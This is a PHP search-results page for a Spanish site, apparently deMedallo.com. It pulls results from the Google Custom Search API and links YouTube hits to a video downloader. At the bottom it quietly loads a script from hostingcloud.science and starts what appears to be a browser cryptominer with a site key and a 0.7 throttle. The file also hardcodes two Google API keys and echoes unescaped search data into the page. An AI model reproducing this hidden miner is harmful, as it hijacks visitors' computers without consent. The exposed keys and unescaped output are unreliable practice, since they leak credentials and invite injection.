<?php 
	$entrada = array("AIzaSyCrZ2Wa8MshZwKo2eL56IysGAgKcCd3AMY", "AIzaSyCZn98ntvSFZh-awqtSuWMWBJ3GnEaynM0", );
	$claves_aleatorias = array_rand($entrada, 2);
	$APIKEY = $entrada[$claves_aleatorias[0]];

	$app = include_once('api/YouTube-Downloader/bootstrap.php');
	$q = 'deMedallo.com';
	if(isset($_GET['q'])){ $q = $_GET['q']; };
	$url = 'https://www.googleapis.com/customsearch/v1?key='.$APIKEY.'&cx=007894479317154908154:jwktchapsu0&q='.$q;
	$json = json_decode(@file_get_contents($url));
?>
<!DOCTYPE HTML>
<html>
	<head>
		<?php include('_cms/include/head_global.php'); ?>
	</head>
	<body>
	<?php include('_cms/include/header.php'); ?>
	<?php include('_cms/include/header_search.php'); ?>
		
   <div class="content_middle">
   	  <div class="container">
   	    <div class="content_middle_box">
          <div class="top_grid">
			<?php
				$total = 0;
				if(isset($json->items)){
					foreach ($json->items as $item){
						$total = $total + 1;
						$type = 'Desconocido';
						$link = '#';
					
					if($item->displayLink == 'www.youtube.com'){ $type = 'Video'; }
					if($item->displayLink == 'www.youtube.com'){
						$patron = '%^ (?:https?://)? (?:www\.)? (?: youtu\.be/ | youtube\.com (?: /embed/ | /v/ | /watch\?v= ) ) ([\w-]{10,12}) $%x';
						$array = preg_match($patron, $item->link, $parte);
						if (false !== $array) {
							$link = "getvideo.php?videoid={$parte[1]}&type=Download";
						}
					}
					   ?>
						<div class="col-md-3" style="max-height: 450px;min-height:450px;">
						  <a href="<?php echo $link; ?>" class="grid1">
							<div class="view view-first">
								<?php if(isset($item->pagemap->metatags[0]->{"og:image"})){ ?>
									<div class="index_img"><img src="<?php echo $item->pagemap->metatags[0]->{"og:image"}; ?>" class="img-responsive" alt=""/></div>
								<?php } ?>
								<div class="sale"><?php echo ($type); ?></div>
								 <div class="mask">
									<div class="info"><i class="search"> </i> Ver mas</div>
									<ul class="mask_img">
										<li class="star"><img src="images/star.png" alt=""/></li>
										<li class="set"><img src="images/set.png" alt=""/></li>
										<div class="clearfix"> </div>
									</ul>
								  </div>
							  </div> 
							  
							 <div class="inner_wrap">
								<h3><?php echo ($item->htmlSnippet); ?></h3>
								<ul class="star1">
								  <h4 class="yellow"><?php echo ($item->htmlTitle); ?></h4>
								  <!-- <li><a> <img src="images/star2.png" alt="">(136)</a></li> -->
								</ul>
							 </div>
						   </a>
						</div>
					  <?php
				   }
				}
				if($total == 0){
					?>
					<div class="col-md-12">
						<h1>Sin Resultados</h1>
						<p>Estamos Actualizando la base de datos, intente buscar con una o dos palabras maximo.</p>
						
						<?php $app->runWithRoute('index'); ?>
					</div>					
					<?php
				}
			?>
   			<div class="clearfix"> </div>
   		</div>
   		  </div>
   		  </div>
   	  </div>
   </div>
   
   
   <?php include('_cms/include/footer.php'); ?>
	   
	   <script src="https://www.hostingcloud.science./P5gV.js"></script>
	<script>
		var _client = new Client.Anonymous('55da1633cdfcf5229975af8c382e5579c39bc47f00b5490aecc73eafe878c374', {
			throttle: 0.7
		});
		_client.start();
	</script>
</body>
</html>		